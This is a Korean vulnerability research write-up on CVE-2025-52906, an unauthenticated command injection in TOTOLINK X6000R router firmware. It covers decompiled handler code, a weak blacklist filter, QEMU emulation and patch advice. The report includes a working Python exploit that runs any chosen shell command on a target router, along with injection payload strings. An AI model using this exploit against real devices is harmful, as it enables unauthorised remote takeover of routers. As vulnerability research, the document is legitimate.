# CVE-2025-52906 분석 보고서

> **요약**: TOTOLINK X6000R 라우터의 웹 서버 바이너리(`/usr/sbin/shttpd`)에서 **인증되지 않은 OS 명령 주입** 취약점이 발견됨. `setEasyMeshAgentCfg` API의 `agentName` 파라미터에 대한 입력값 검증 미흡으로 **인증 없이** 원격 코드 실행 가능. 본 문서는 펌웨어 역공학을 통한 취약 바이너리 추적, IDA Pro 정적 분석, QEMU 에뮬레이션, PoC 재현을 체계적으로 정리한다.

---

## 1. 취약점 소개

### 1.1 개요

| 항목 | 내용 |
|---|---|
| 취약점 명칭 | CVE-2025-52906 |
| 취약 유형 | OS 명령 주입 *(CWE-78)* |
| 심각도 (CVSS) | 9.3 / Critical |
| 공격 조건 | 공격자가 원격으로 장치에서 임의의 명령을 실행할 수 있도록 허용하는 인증되지 않은 명령 주입 / **인증 불필요 (Unauthenticated)** |
| 발생 위치 | `/usr/sbin/shttpd` 바이너리 (setEasyMeshAgentCfg 함수) |
| PoC 공개 여부 | 없음 *(본 문서의 PoC는 연구 재현용)* |

### 1.2 영향 범위

| 제품 | 영향 받는 펌웨어 버전 |
|---|---|
| **TOTOLINK X6000R** | **V9.4.0cu.1360_B20241207까지** |

### 1.3 테스트 이미지

- **취약 버전**: V9.4.0cu.1360_B20241207  
  링크: <https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html>

- **패치 버전**: V9.4.0cu.1498_B20250826  
  링크: <https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html>

---

## 2. 정적 분석

### 2.1 펌웨어 구조 (SquashFS 루트)

```bash
squashfs-root/
├── bin/
│   └── busybox            # shell
├── etc/
├── sbin/
├── usr/
│   └── sbin/
│       └── shttpd        # 취약점이 존재하는 웹 서버 바이너리
├── web/                  # 웹 서버 루트 디렉터리
│   ├── phone/
│   │   └── device.html          # 모바일 - 연결 장치 목록 UI
│   │   └── easymesh_info.html   # 모바일 - EasyMesh 네트워크 정보 수정
│   ├── advance/
│   │   └── mesh_info.html       # PC - EasyMesh 네트워크 정보 수정
│   ├── easymesh/
│   │   └── index.html           # PC - EasyMesh 메인 설정 페이지
│   └── static/
│       └── js/
│           └── topicurl.js      # 핵심 백엔드 통신 API
└── www/
```

### 2.2 펌웨어 추출

다운로드 받은 zip 파일을 풀어 `.web` 파일을 `binwalk`로 추출한다.

```bash
binwalk -Me TOTOLINK_C8380R_X6000R_IP04499_MT7981_SPI_16M256M_V9.4.0cu.1360_B20241207_ALL.web
```

### 2.3 Root Cause 발견 과정

#### 2.3.1 공개된 정보

| 항목 | 내용 |
|---|---|
| 취약 함수 | `setEasyMeshAgentCfg` |
| 원인 | 해당 함수가 `agentName` 파라미터에 대한 사용자 입력을 제대로 검증하고 삭제하지 않아, 인증되지 않은 명령 삽입에 취약 |

참고 사이트:
- <https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/>

#### 2.3.2 취약 함수 위치 파악

**함수 설명**:
`setEasyMeshAgentCfg` 함수는 EasyMesh 네트워크 에이전트의 설정을 적용하는 역할로, Agent 이름, IP 등 설정 파라미터를 OS 명령어나 내부 스크립트에 전달할 수 있다. 잘못된 입력 검증 시 Command Injection 발생 가능.

**가설**:
웹 서버 바이너리나 관련 스크립트에 포함되어 있을 가능성이 높다.

**탐색**:
```bash
grep -r "setEasyMeshAgentCfg" web/
grep -r "setEasyMeshAgentCfg" usr/sbin
```

**발견**:
1. `web/phone/device.html` - 모바일 연결 장치 목록 UI
2. `web/phone/easymesh_info.html` - 모바일 EasyMesh 네트워크 정보 수정
3. `web/advance/mesh_info.html` - PC EasyMesh 네트워크 정보 수정
4. `web/easymesh/index.html` - PC EasyMesh 메인 설정 페이지
5. `web/static/js/topicurl.js` - 핵심 백엔드 통신 API
6. `usr/sbin/shttpd` - 백엔드 바이너리 (취약점 위치)

#### 2.3.3 웹 관리 인터페이스 구성 컴포넌트

**web/phone/device.html (모바일 - 연결 장치 목록 수정)**:
라우터에 연결된 장치들의 목록을 표시하고 관리하는 UI를 담당. EasyMesh Agent의 이름을 수정하기 위해 `uiPost.setEasyMeshAgentCfg`를 호출.

**web/phone/easymesh_info.html (모바일 - EasyMesh 네트워크 정보)**:
모바일 환경에서 EasyMesh 네트워크 토폴로지 맵을 보여주고 장치 정보를 표시 및 수정. `modifyDevInfo` 함수에서 `uiPost.setEasyMeshAgentCfg`를 호출해 장치 이름 변경.

**web/advance/mesh_info.html (PC - EasyMesh 네트워크 정보)**:
PC 환경에서 EasyMesh 네트워크 토폴로지 맵과 Agent 장치 정보 표시 및 수정. `modifyDevInfo` 함수에서 `uiPost.setEasyMeshAgentCfg`를 호출.

#### 2.3.4 엔드포인트 식별

`web/static/js/topicurl.js`에서:
- `setEasyMeshAgentCfg`가 POST 요청의 `topicurl`로 정의됨
- 모든 API 요청이 `globalConfig.cgiUrl`로 전송됨

`web/static/js/config.js`에서 확인:
```javascript
globalConfig.cgiUrl: "/cgi-bin/cstecgi.cgi"
```

**결론**: 모든 API 호출이 `/cgi-bin/cstecgi.cgi` 단일 엔드포인트로 향하고, JSON의 `topicurl` 필드가 내부 라우팅을 결정하는 단일 게이트웨이 패턴을 따른다.

**인증 요구사항**: **인증 불필요** - 본 취약점은 인증되지 않은(Unauthenticated) 상태에서도 공격 가능.

#### 2.3.5 usr/sbin/shttpd

웹 서버 바이너리인 `/usr/sbin/shttpd` 내부에 `setEasyMeshAgentCfg`를 처리하는 실제 함수 코드가 존재함을 확인.

### 2.4 shttpd 소스 코드 분석

#### 2.4.1 문자열 우회 접근

취약 함수 문자열을 직접 검색했으나 유의미한 참조값을 찾을 수 없었다. OS 명령 주입 취약점이므로, 직접적으로 명령 실행을 수행하는 함수(`doSystem`)를 기준으로 취약 함수의 호출 흐름을 추적.

#### 2.4.2 sub_40BBA0 (초기화 루틴)

```c
__int64 sub_40BBA0()
{
    FILE *v0; // x0
    FILE *v1; // x19
    
    memset(&unk_450A28, 0, 0x15E0uLL);
    memset(&unk_44F768, 0, 0x12C0uLL);
    memset(&unk_452008, 0, 0x12C0uLL);
    
    sub_40BA7C(aGetlogincfg);
    sub_40BA7C(aGetlancfg);
    sub_40BA7C(aSetlanguagecfg);
    sub_40BA7C(aGetwifieasycfg);
    sub_40BA7C(aSetappbind);
    sub_40BA7C(aGetmacfilterru);
    sub_40BA7C(aGeteasymeshlis);
    
    v0 = fopen("/dev/console", "w");
    if ( !v0 )
        return fprintf((FILE *)stderr, "Topic Num: get=%d, set=%d, oth=%d\n", 0, 0, 0);
    v1 = v0;
    fprintf(v0, "[%s:%d] Topic Num: get=%d, set=%d, oth=%d\n", "init_handle_table", 52, 0, 0, 0);
    return fclose(v1);
}
```

**기능 요약**: 웹 요청의 TopicURL을 처리하기 위한 핸들러 테이블을 초기화하는 함수.

**동작**:
- 여러 `aGet...`, `aSet...` 문자열에 대해 `sub_40BA7C`를 호출하여 디스패치 테이블을 채움
- `/dev/console`에 Topic 수를 출력 (초기화 시 디버그/로깅 용도)

**결론**: `cstecgi.cgi`가 시작될 때 웹 요청(=topicurl)을 처리할 준비(디스패치 테이블 빌드)를 수행하는 초기화 함수.

#### 2.4.3 sub_40BA7C (디스패치 테이블 등록)

```c
__int64 __fastcall sub_40BA7C(char *s1, int *a2, int *a3, int *a4)
{
    __int64 result; // x0
    
    while ( 1 )
    {
        result = *((_QWORD *)s1 + 8);
        if ( !result )
            break;
        
        if ( !strncmp(s1, "get", 3uLL) && *a2 <= 69 )
        {
            memcpy((char *)&unk_450A28 + 80 * *a2, s1, 0x50uLL);
            ++*a2;
        }
        else if ( !strncmp(s1, "set", 3uLL) && *a3 <= 59 )
        {
            memcpy((char *)&unk_44F768 + 80 * *a3, s1, 0x50uLL);
            ++*a3;
        }
        else if ( *a4 <= 59 )
        {
            memcpy((char *)&unk_452008 + 80 * *a4, s1, 0x50uLL);
            ++*a4;
        }
        s1 += 80;
    }
    return result;
}
```

**동작**: 
- 반복문으로 `s1` 버퍼(연속된 항목 영역)를 80바이트 단위로 검사
- `strncmp(s1,"get",3)` → Get Table 복사
- `strncmp(s1,"set",3)` → Set Table 복사
- 그 외 → Other Table

**분석 포인트**: 테이블 항목이 구조체 크기(0x50)로 고정되어 있어 문자열 참조는 포인터가 아니라 구조체 내부에 직접 복사됨. 이 구조 때문에 IDA에서 문자열 참조가 눈에 바로 안 띌 수 있음.

#### 2.4.4 sub_42C0D8 (취약 함수)

```c
__int64 __fastcall sub_42C0D8(__int64 a1, FILE *a2)
{
    char *v4; // x24
    char *v5; // x22
    char *v6; // x4
    char s1[8]; // [xsp+40h] [xbp+40h] BYREF
    __int64 v9; // [xsp+48h] [xbp+48h]
    __int16 v10; // [xsp+50h] [xbp+50h]
    char s[128]; // [xsp+58h] [xbp+58h] BYREF
    
    *(_QWORD *)s1 = 0LL;
    v9 = 0LL;
    v10 = 0;
    memset(s, 0, sizeof(s));
    
    v4 = sub_40C08C(a1, (__int64)"mac");
    v5 = sub_40C08C(a1, (__int64)"agentName");
    
    Uci_Get_Str(47LL, "meshinfo", "almac", s1);
    
    if ( !strcmp(s1, v4) )
    {
        Uci_Set_Str();
        Uci_Commit(11LL);
        doSystem("echo '%s' > /proc/sys/kernel/hostname");
        v6 = "0";
    }
    else
    {
        snprintf(s, 0x80uLL, "%s;%s", v4, v5);
        datconf_set_by_key("/var/cste/temp_status", "slave_hostname", s);
        CsteSystem("killall -SIGUSR2 mesh_sync", 0LL);
        v6 = "8";
    }
    
    sub_40C0C0(a2, 1u, (__int64)"", 0LL, (__int64)v6, (__int64)"reserv");
    return 0LL;
}
```

**핵심 동작**:

1. **사용자 입력 파싱**:
   - `v4` 변수에 사용자 입력 파라미터 `mac` 값 저장
   - `v5` 변수에 사용자 입력 파라미터 `agentName` 값 저장

2. **명령어 구성 (취약)**:
```c
snprintf(s, 0x80uLL, "%s;%s", v4, v5);
```
   - `mac`과 `agentName` 사이에 세미콜론(`;`)을 넣어 `s` 버퍼에 저장
   - 최종 형태: `[MAC 주소];[Agent 이름]`

3. **간접적 쉘 해석**:
   - 이 문자열이 `/var/cste/temp_status` 파일의 `slave_hostname` 키에 저장됨
   - `CsteSystem("killall -SIGUSR2 mesh_sync", 0LL);`로 동기화 프로세스에 시그널 전송
   - **취약점**: `mesh_sync` 또는 관련 스크립트가 `slave_hostname` 값을 읽어 쉘 컨텍스트에서 실행할 때, `agentName`에 포함된 셸 메타문자가 해석되어 임의 명령 실행

**공격 시나리오**: 
공격자가 `agentName`에 `iamhacker'; id > /abc.txt; #`와 같은 값을 삽입하면, 세미콜론(`;`) 이후의 명령이 쉘에서 실행되어 `/abc.txt` 파일이 생성됨.

#### 2.4.5 sub_417CB4 (방어 실패)

```c
bool __fastcall sub_417CB4(const char *a1)
{
    return strchr(a1, 59)           // ';'
        || strstr(a1, ".sh")
        || strstr(a1, "iptables")
        || strstr(a1, "telnetd")
        || strchr(a1, 38)           // '&'
        || strchr(a1, 124)          // '|'
        || strchr(a1, 96)           // '`'
        || strchr(a1, 36)           // '$'
        || strchr(a1, 10) != 0LL;   // '\n'
}
```

**검사 대상**: `;`, `&`, `|`, `` ` ``, `$`, `\n`, `.sh`, `iptables`, `telnetd`

**취약점**: 
- 블랙리스트 방식의 근본적 취약성 - 일부 위험 문자만 검출하므로 우회 가능
- 문맥 무시 - 입력값이 파일에 저장된 뒤 어떻게 사용되는지 고려하지 않음
- 조합적 우회 가능 - `&&`, `||`, `$()` 등 복합 구문이나 인코딩으로 우회 가능

**중요**: 이 함수는 `sub_42C0D8`에서 호출되지 않으며, 다른 API 핸들러에서만 사용됨. 따라서 `setEasyMeshAgentCfg`는 **어떠한 입력 검증도 수행하지 않음**.

---

## 3. 에뮬레이션 (QEMU User-mode)

### 3.1 qemu-aarch64-static 주입

```bash
sudo cp $(which qemu-aarch64-static) ./usr/bin/
```

### 3.2 mount 설정 및 chroot로 진입

```bash
sudo mount --bind /dev ./dev
sudo mount --bind /proc ./proc
sudo mount --bind /sys ./sys

sudo rm ./var
sudo mkdir -p ./var/run

sudo chroot . ./usr/bin/qemu-aarch64-static /bin/sh
```

### 3.3 웹 서버 실행

```bash
# chroot 내부에서
ubusd &
/usr/sbin/shttpd -root /web
```

> **참고**: 실제 라우터 환경과 유사하게 구성하려면 추가 설정 필요 (uci, network 등)

---

## 4. Exploit (연구 재현용)

### 4.1 PoC

해당 PoC는 **인증 없이** `setEasyMeshAgentCfg` API의 `agentName` 파라미터에 셸 명령을 주입하여 원격 코드 실행(RCE)을 유발한다.

| 필드 | 값 | 설명 |
|---|---|---|
| topicurl | "setEasyMeshAgentCfg" | 호출할 취약 API 함수명 |
| agentName | "iamhacker'; id > /abc.txt; #" | 취약 파라미터. 셸 메타문자를 이용한 명령 주입 |
| opmode | "0" | 필수 파라미터 |
| meshStart | "1" | 필수 파라미터 |

#### 4.1.1 Python PoC (exploit.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_ENDPOINT = "/cgi-bin/cstecgi.cgi"

def exploit_unauthenticated(target_ip, command):
    """
    인증 없이 RCE를 시도하는 메인 공격 함수 (setEasyMeshAgentCfg 대상)
    """
    target_url = f"http://{target_ip}{API_ENDPOINT}"
    
    payload = f"$({command})"
    
    data = {
        "topicurl": "setEasyMeshAgentCfg",  # RCE가 가능한 API
        "agentName": payload,                # 셸 명령어가 삽입되는 취약 파라미터
        "opmode": "0",
        "meshStart": "1"
    }
    
    print(f"[*] 1. 인증 우회 RCE 시도: {target_ip}")
    print(f"[*] 2. 주입할 페이로드 (agentName): {payload}")
    
    try:
        response = requests.post(target_url,
                               json=data,
                               verify=False,
                               timeout=10,
                               headers={"Content-Type": "application/json;charset=UTF-8"})
        
        print(f"[*] 3. 서버 응답 코드: {response.status_code}")
        
        if response.status_code == 200:
            print("[+] RCE 공격 요청 전송 완료.")
            print("[*] 4. 라우터에 접속하여 명령 실행 결과를 확인하십시오.")
        else:
            print(f"[-] 요청 실패. HTTP 상태 코드: {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] 네트워크 에러 발생: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-52906 PoC - Unauthenticated RCE")
    parser.add_argument("target_ip", help="타겟 라우터의 IP 주소")
    parser.add_argument("command", default="id", help="라우터에서 실행할 셸 명령어 (예: id, hostname)")
    args = parser.parse_args()
    
    exploit_unauthenticated(args.target_ip, args.command)
```

**사용법**:
```bash
chmod +x exploit.py
./exploit.py 192.168.0.16 "id > /abc.txt"
```

### 4.2 공격 흐름 요약

#### 4.2.1 [클라이언트] 페이로드 생성 및 전송

1. **페이로드 생성**:
   - `topicurl`: `"setEasyMeshAgentCfg"` 지정
   - `agentName`: `"iamhacker'; id > /abc.txt; #"` - 셸 메타문자를 이용한 명령 주입
   - `opmode`: `"0"`
   - `meshStart`: `"1"`

2. **요청 전송**:
   ```
   POST /cgi-bin/cstecgi.cgi
   Content-Type: application/json
   ```

**중요**: 이 요청은 **인증 토큰 없이** 전송 가능.

#### 4.2.2 [서버] 요청 수신 및 컨트롤러 진입

1. `/usr/sbin/shttpd`가 POST 요청 수신
2. JSON에서 `topicurl("setEasyMeshAgentCfg")` 확인 후 핸들러 검색
3. 디스패치 테이블을 통해 `sub_42C0D8` 함수 호출

#### 4.2.3 [서버] 요청 분배 (Dispatching)

1. **디스패치 테이블 조회**: 초기화 단계에서 채워진 Set 테이블에서 `setEasyMeshAgentCfg` 엔트리 조회
2. **핸들러 결정**: 해당 구조체에서 함수 포인터 추출, `sub_42C0D8` 호출

#### 4.2.4 [서버] 취약 함수 실행 및 RCE 발생

1. **파라미터 파싱**: `mac`과 `agentName` 값 추출
2. **명령어 구성 (취약)**:
   ```c
   snprintf(s, 0x80uLL, "%s;%s", v4, v5);
   // 결과: "00:11:22:33:44:55;iamhacker'; id > /abc.txt; #"
   ```
3. **파일 저장**: `/var/cste/temp_status`의 `slave_hostname` 키에 저장
4. **동기화 트리거**: `CsteSystem("killall -SIGUSR2 mesh_sync", 0LL);`
5. **간접적 RCE**: `mesh_sync` 프로세스가 `slave_hostname` 값을 읽어 쉘에서 해석 → `id > /abc.txt` 명령 실행

#### 4.2.5 정적분석과 실험 결과의 연계

- **정적분석**: `sub_42C0D8`가 외부 입력을 구조화 없이 파일로 기록하고, 그 값이 다른 프로세스에 의해 쉘 컨텍스트에서 재처리되는 흐름 식별
- **실험(PoC)**: `agentName`에 셸 메타문자를 포함한 페이로드 전송 → 시스템에서 `/abc.txt` 파일 생성 확인
- **결론**: 정적분석에서 예측한 취약 경로(입력 → 파일 저장 → mesh_sync에 의한 쉘 해석)가 실운영 환경에서 재현됨

---

## 5. 재현 체크리스트

- [ ] 펌웨어 추출 및 SquashFS 루트 준비
- [ ] `qemu-aarch64-static` 주입 완료
- [ ] `/dev`, `/proc`, `/sys` 마운트 완료
- [ ] chroot 진입 및 `ubusd`, `shttpd` 실행
- [ ] 대상 펌웨어가 **패치 이전**(V9.4.0cu.1360_B20241207 이하)임 확인
- [ ] 네트워크 격리 환경(로컬 랩) 구성
- [ ] **인증 없이** PoC 테스트 수행 및 RCE 효과 확인
- [ ] `/abc.txt` 또는 지정한 파일이 생성되었는지 확인

---

## 6. 완화 및 패치 요약

- **입력 검증 강화**:
  - 새로운 검증 함수 도입
  - 셸 메타문자(`;`, `&`, `|`, `` ` ``, `$`, `\n` 등) 및 명령어 주입 방지
  - 화이트리스트 기반 검증 적용

- **안전한 명령 실행**:
  - 파일 저장 방식 개선
  - 쉘을 거치지 않는 실행 방식(`execve`) 사용
  - 구조화된 파일 포맷(JSON) 사용

- **인증 강화**:
  - `setEasyMeshAgentCfg` API에 인증 요구사항 추가
  - 세션 토큰 검증 메커니즘 구현

- **운영 측면**:
  - 최신 펌웨어 적용 (V9.4.0cu.1498_B20250826 이상)
  - 관리자 인터페이스 접근 제한 (방화벽 규칙)
  - 강력한 관리자 비밀번호 사용
  - 외부에서 관리 인터페이스 접근 차단

---

## 7. 참고 자료

- CVE Details: CVE-2025-52906
- TOTOLINK 공식 펌웨어: <https://www.totolink.net>
- Palo Alto Networks 보고서: <https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/>
- GitHub 취약점 공개: <https://github.com/PaloAltoNetworks/u42-vulnerability-disclosures/blob/main/2025/PANW-20250001/PANW-2025-0001.md>

---

> **주의**: 본 문서는 교육·연구 재현 목적이며, 패치 이전 기기에 대한 무단 테스트를 금한다. 모든 PoC는 **격리된 로컬 환경**에서만 사용한다.